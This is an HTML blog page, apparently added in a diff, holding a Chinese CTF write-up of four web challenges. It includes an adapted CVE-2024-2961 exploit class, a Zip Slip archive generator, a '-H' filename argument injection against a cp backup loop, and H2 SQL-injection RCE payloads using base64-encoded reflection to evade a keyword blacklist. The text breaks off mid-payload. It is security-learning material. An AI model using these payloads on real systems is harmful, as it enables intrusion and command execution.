@@ -1,0 +1,475 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-splash="0">
+  <head>
+    <!-- meta information -->
+<meta charset="utf-8">
+<script>
+  // 这段必须在首次绘制前跑完，否则会闪白/闪一下页面
+  (function () {
+    var root = document.documentElement;
+
+    // 1) 主题：先 localStorage，再跟随系统
+    var t = null;
+    try { t = localStorage.getItem('blog-theme'); } catch (e) { }
+    if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    root.setAttribute('data-theme', t);
+
+    // 2) 有 JS 才显示开场/转场遮罩；没有 JS 时页面照常可读
+    root.classList.add('js');
+    var wantsSplash = root.getAttribute('data-splash') === '1';
+    var seen = false;
+    try { seen = sessionStorage.getItem('blog-splash') === '1'; } catch (e) { }
+    if (wantsSplash && !seen) {
+      root.classList.add('has-splash');
+    } else {
+      // 这次是「进场」，先让转场遮罩合上，再由 JS 打开
+      root.classList.add('enter-transition');
+    }
+  })();
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<meta name="description" content="看看2月题，一定要全部搞懂。 1.Gavatar:看看签到题。 刚进入页面的登录没什么可以操作的，不是一个注入。关键在上传头像。 可以看到可以通过链接的方式上传头像。再看源码： elseif (!empty($_POST[&#39;url&#39;])) ">
+<meta name="author" content="祈染安">
+<meta name="theme-color" content="#141414">
+
+<title>N1的2月题 &middot; 安的角落</title>
+
+<!-- icons -->
+<link rel="shortcut icon" href="/images/favicon.ico">
+
+<!-- stylesheets -->
+<link rel="stylesheet" href="/css/syntax.css">
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- feed -->
+<link rel="alternate" href="/feed.xml" type="application/rss+xml" title="安的角落">
+
+  <meta name="generator" content="Hexo 7.3.0"></head>
+  <body>
+    <!--
+  磁力光标：四个直角括号，靠近可吸附元素时被“吸”过去并放大；
+  吸附目标的描边图标会同时被描一遍（见 frontend.js 的 drawIcon）。
+-->
+<div class="cursor" id="cursor" aria-hidden="true">
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_label" id="cursor-label"></div>
+</div>
+
+    <!--
+  转场动画：两张“纸”从中间合上/打开，接缝处是一排声波条，
+  右下角有一枚折角，打开时会把折角展开。
+  离开页面时合上 → 新页面打开，跨页也连贯（Hexo 也是多页站点）。
+-->
+<div class="transition" id="transition" aria-hidden="true">
+  <div class="transition_half transition_half--top"></div>
+  <div class="transition_half transition_half--bottom"></div>
+
+  <div class="transition_bars">
+    
+    <div class="transition_bar" style="--d: 0.000s"></div>
+    
+    <div class="transition_bar" style="--d: 0.012s"></div>
+    
+    <div class="transition_bar" style="--d: 0.024s"></div>
+    
+    <div class="transition_bar" style="--d: 0.036s"></div>
+    
+    <div class="transition_bar" style="--d: 0.048s"></div>
+    
+    <div class="transition_bar" style="--d: 0.060s"></div>
+    
+    <div class="transition_bar" style="--d: 0.072s"></div>
+    
+    <div class="transition_bar" style="--d: 0.084s"></div>
+    
+    <div class="transition_bar" style="--d: 0.096s"></div>
+    
+    <div class="transition_bar" style="--d: 0.108s"></div>
+    
+    <div class="transition_bar" style="--d: 0.120s"></div>
+    
+    <div class="transition_bar" style="--d: 0.132s"></div>
+    
+    <div class="transition_bar" style="--d: 0.144s"></div>
+    
+    <div class="transition_bar" style="--d: 0.156s"></div>
+    
+    <div class="transition_bar" style="--d: 0.168s"></div>
+    
+    <div class="transition_bar" style="--d: 0.180s"></div>
+    
+    <div class="transition_bar" style="--d: 0.192s"></div>
+    
+    <div class="transition_bar" style="--d: 0.204s"></div>
+    
+    <div class="transition_bar" style="--d: 0.216s"></div>
+    
+    <div class="transition_bar" style="--d: 0.228s"></div>
+    
+    <div class="transition_bar" style="--d: 0.240s"></div>
+    
+    <div class="transition_bar" style="--d: 0.252s"></div>
+    
+    <div class="transition_bar" style="--d: 0.264s"></div>
+    
+    <div class="transition_bar" style="--d: 0.276s"></div>
+    
+    <div class="transition_bar" style="--d: 0.288s"></div>
+    
+    <div class="transition_bar" style="--d: 0.300s"></div>
+    
+    <div class="transition_bar" style="--d: 0.312s"></div>
+    
+    <div class="transition_bar" style="--d: 0.324s"></div>
+    
+    <div class="transition_bar" style="--d: 0.336s"></div>
+    
+    <div class="transition_bar" style="--d: 0.348s"></div>
+    
+    <div class="transition_bar" style="--d: 0.360s"></div>
+    
+    <div class="transition_bar" style="--d: 0.372s"></div>
+    
+    <div class="transition_bar" style="--d: 0.384s"></div>
+    
+    <div class="transition_bar" style="--d: 0.396s"></div>
+    
+    <div class="transition_bar" style="--d: 0.408s"></div>
+    
+    <div class="transition_bar" style="--d: 0.420s"></div>
+    
+  </div>
+
+  <div class="transition_fold"></div>
+</div>
+
+    
+
+    
+<!--
+  头像独立于 .nav 之外：.nav 用 clip-path 从左侧张开，
+  如果头像在里面会被一起裁掉，就看不到“以头像为起点”的效果了。
+-->
+<a class="nav_logo" id="nav-logo" href="/"
+   aria-label="祈染安 的主页" data-magnetic data-cursor="回到主页">
+  <img src="/images/logo.png" alt="祈染安">
+</a>
+
+<nav class="nav" id="main-navigation" aria-label="主导航">
+  <div class="nav_items">
+    
+    <a class="nav_item"
+       href="/"
+       data-magnetic data-stroke data-cursor="主页">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M3.2 10.7 12 3.4l8.8 7.3"/><path d="M5.7 9.9v10.3h12.6V9.9"/><path d="M9.8 20.2v-5.5h4.4v5.5"/></svg></span>
+      <span class="nav_item_label"><span>主页</span></span>
+    </a>
+    
+    <a class="nav_item"
+       href="/links/"
+       data-magnetic data-stroke data-cursor="友链">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M10.2 13.8 13.8 10.2"/><path d="M12.5 7.1 14.1 5.5a3.4 3.4 0 0 1 4.8 4.8l-1.6 1.6"/><path d="M11.5 16.9 9.9 18.5a3.4 3.4 0 0 1-4.8-4.8l1.6-1.6"/></svg></span>
+      <span class="nav_item_label"><span>友链</span></span>
+    </a>
+    
+    <a class="nav_item"
+       href="/tags/"
+       data-magnetic data-stroke data-cursor="标签">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M3.4 11.6V5.2a1.8 1.8 0 0 1 1.8-1.8h6.4l9 9-8.2 8.2-9-9Z"/><circle cx="8" cy="8" r="1.4"/></svg></span>
+      <span class="nav_item_label"><span>标签</span></span>
+    </a>
+    
+  </div>
+
+  <div class="nav_right">
+    <button class="nav_theme" id="theme-toggle" type="button"
+            data-magnetic data-stroke aria-label="切换深浅色" data-cursor="深浅色">
+      <span class="nav_item_icon nav_theme_icon nav_theme_icon--moon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20.6 14.2A8.6 8.6 0 0 1 9.8 3.4a8.6 8.6 0 1 0 10.8 10.8Z"/></svg></span>
+      <span class="nav_item_icon nav_theme_icon nav_theme_icon--sun"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="4.2"/><path d="M12 2.6v2.2M12 19.2v2.2M2.6 12h2.2M19.2 12h2.2M5.4 5.4l1.6 1.6M17 17l1.6 1.6M18.6 5.4 17 7M7 17l-1.6 1.6"/></svg></span>
+    </button>
+  </div>
+</nav>
+
+
+    <main class="page" id="page">
+      
+<article class="post wrap">
+  <header class="post_head">
+    <p class="post_head_date reveal"><span>2025.11.12</span></p>
+    <h1 class="post_head_title" data-split-lines>N1的2月题</h1>
+    
+    <p class="post_head_tag"><span class="tagpill">CTF</span></p>
+    
+  </header>
+
+  <div class="post_body" data-reveal-body>
+    <p>看看2月题，一定要全部搞懂。  </p>
+<h2 id="1-Gavatar"><a href="#1-Gavatar" class="headerlink" title="1.Gavatar:"></a>1.Gavatar:</h2><p>看看签到题。  </p>
+<p>刚进入页面的登录没什么可以操作的，不是一个注入。关键在上传头像。  </p>
+<p><img src="/images/CTF/N1-2-1.png" alt="创建头像">  </p>
+<p>可以看到可以通过链接的方式上传头像。再看源码：  </p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$image</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$image</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid URL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$avatarPath</span><span class="token punctuation">,</span> <span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>这里发现一个没有任何过滤的file_get_contents函数，意味着可以通过这个函数进行本地任意文件读取。  </p>
+<p>在给出的源码中有一个readflag.go文件，我猜测我要使用命令去读取flag文件。  </p>
+<p>此时就需要将这个任意文件读取进一步形成任意命令执行。  </p>
+<p>这里看到一个cve：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md">CVE-2024-2961</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14986">详细一点的</a><br><a target="_blank" rel="noopener" href="https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html">原作者</a></p>
+<p>有现成的脚本，需要自己手改。  </p>
+<p>修改remote类：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url
+        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">'/login.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.
+        """</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">'/upload.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'url'</span><span class="token punctuation">:</span> path<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.
+        """</span>
+        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+        _ <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
+
+        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">'/avatar.php'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+
+<p>我自己用的时候报错了，应该是本地容器的配置问题。正常情况应该就能拿到shell了。</p>
+<p>ps：为什么一开始就会去看源码中的upload.php文件呢？因为我下载源码的时候就这玩意被杀软杀了。。  </p>
+<h2 id="2-traefik"><a href="#2-traefik" class="headerlink" title="2.traefik"></a>2.traefik</h2><p>直接先看源码：</p>
+<pre class="language-go" data-language="go"><code class="language-go">r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/public/upload"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    file<span class="token punctuation">,</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">FormFile</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+      c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"File upload failed"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+      <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+
+    randomFolder <span class="token operator">:=</span> <span class="token function">randFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    destDir <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">,</span> randomFolder<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">MkdirAll</span><span class="token punctuation">(</span>destDir<span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+      c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to create directory"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+      <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+
+    zipFilePath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">,</span> randomFolder<span class="token operator">+</span><span class="token string">".zip"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">SaveUploadedFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> zipFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+      c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to save uploaded file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+      <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> err <span class="token operator">:=</span> <span class="token function">unzipFile</span><span class="token punctuation">(</span>zipFilePath<span class="token punctuation">,</span> destDir<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+      c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to unzip file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+      <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+
+    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+      <span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"File uploaded and extracted successfully to %s"</span><span class="token punctuation">,</span> destDir<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+  r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">)</span></code></pre>
+
+<p>可以看出来这是一个很明显的文件上传，并且没有任何的waf。  </p>
+<p>于是我一开始犯了一个根本性的错误：我进行了一句话木马的上传。  </p>
+<p>然而，因为这个函数是由go语言编写的，不具备php文件的理解能力，所以就算没有过滤，我的木马也没有办法被成功执行。  </p>
+<p>于是要用到另一个技巧：Zip Slip  </p>
+<p>生成恶意zip：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        zipFile <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"poc.zip"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>  <span class="token comment">##生成的zip文件</span>
+        info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"poc.zip"</span><span class="token punctuation">)</span>
+        zipFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"D:/tgao/pass/1"</span><span class="token punctuation">,</span> <span class="token string">"../password"</span><span class="token punctuation">,</span> zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>  <span class="token comment">##压缩的文件和在zip中显示的文件名</span>
+        zipFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> e</code></pre>
+
+<p>上传的文件就是一个我们改写的配置文件，只要能访问到&#x2F;flag就行：</p>
+<pre class="language-go" data-language="go"><code class="language-go">flag<span class="token punctuation">:</span>
+     rule<span class="token punctuation">:</span> <span class="token function">Path</span><span class="token punctuation">(</span><span class="token string">`/flag`</span><span class="token punctuation">)</span>
+     entrypoints<span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>
+     service<span class="token punctuation">:</span> proxy
+     middlewares<span class="token punctuation">:</span>
+       <span class="token operator">-</span> add<span class="token operator">-</span>x<span class="token operator">-</span>forwarded<span class="token operator">-</span><span class="token keyword">for</span></code></pre>
+
+<p>上传之后访问&#x2F;flag拿到。<br><img src="/images/CTF/N1-2-2.png" alt="flag"></p>
+<p>ps：据说是容器有问题，文件上传成功了但是win里还是拿不到。。</p>
+<h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><p>这道题没容器也没源码，只能看看wp写了。。  </p>
+<p>看了一下wp，好像是用命令执行去执行一个后门文件（题目backup应该就是这个意思了）  </p>
+<p>这里拿到shell后需要进行提权，这道题的重心应该就是这个。  </p>
+<p><a target="_blank" rel="noopener" href="https://mooncn.win/tutorial/451.html">提权</a>  </p>
+<p>把backup.sh贴在这里：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token builtin class-name">cd</span> /var/www/html/primary
+<span class="token keyword">while</span> <span class="token builtin class-name">:</span>
+<span class="token keyword">do</span>
+    <span class="token function">cp</span> <span class="token parameter variable">-P</span> * /var/www/html/backup/
+    <span class="token function">chmod</span> <span class="token number">755</span> <span class="token parameter variable">-R</span> /var/www/html/backup/
+    <span class="token function">sleep</span> 15s
+</code></pre>
+
+<p>通过cp将<code>/var/www/html/primary</code>软链接（-p参数）复制到&#x2F;var&#x2F;www&#x2F;html&#x2F;backup&#x2F;，使用chmod赋予可读权限。</p>
+<p>“*” 可以匹配当前目录下的所有文件  </p>
+<p>在cp命令的手册中，-H可以跟随命令符号链接，意味这我们可以获取真实的文件内容，而不仅仅是软链接</p>
+<p>我们可以创建一个名为 -H的文件实现参数的注入</p>
+<p>echo “”&gt;”-H”</p>
+<p>这个时候我们可以创建软链接指向&#x2F;flag</p>
+<p>这个时候cp命令会将真实的flag做备份并且实现可读权限的赋予</p>
+<p><code>ln -s /flag ff</code>  </p>
+<p>现在cp执行的命令实际上是</p>
+<p><code>cp -P -H ff /var/www/html/backup/</code><br>等待15s后就可以访问flag。</p>
+<h2 id="4-easyDB"><a href="#4-easyDB" class="headerlink" title="4.easyDB"></a>4.easyDB</h2><p>附件里面有个jar包，用jadx打开看看源码。（一直很讨厌这种，半天找不到主函数在哪）  </p>
+<p>可以看到有一段sql注入：</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">validateUser</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
+      <span class="token class-name">String</span> query <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE username = '%s' AND password = '%s'"</span><span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">SecurityUtils</span><span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+</code></pre>
+
+<p>查看SecurityUtils函数，发现是一个黑名单：</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
+       blackLists<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       blackLists<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"process"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       blackLists<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       blackLists<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       blackLists<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       blackLists<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       blackLists<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"groovy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+</code></pre>
+
+<p>那么现在的思路应该是怎么绕过进行注入。  </p>
+<p>在pom.xml中可以看到数据库是h2，结合readflag这个文件可以得知要rce。  </p>
+<p>根据h2的特性，我们可以自定义函数并指定别名。</p>
+<p>因此构造payload如下：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">';CREATE ALIAS EXEC AS '</span>String shellexec<span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> throws java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException &#123;Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span>&#125;<span class="token string">';CALL EXEC ('</span>calc'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--</span></code></pre>
+
+<p>因为禁用了exec，所以需要使用java反射进行绕过：</p>
+<pre class="language-java" data-language="java"><code class="language-java">'<span class="token punctuation">;</span><span class="token constant">CREATE</span> <span class="token constant">ALIAS</span> hello <span class="token constant">AS</span> $$ <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"amF2YS5sYW5nLlJ1bnRpbWU="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Method</span> m1 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"Z2V0UnVudGltZQ=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> o <span class="token operator">=</span> m1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Method</span> m2 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"ZXhlYw=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m2<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token 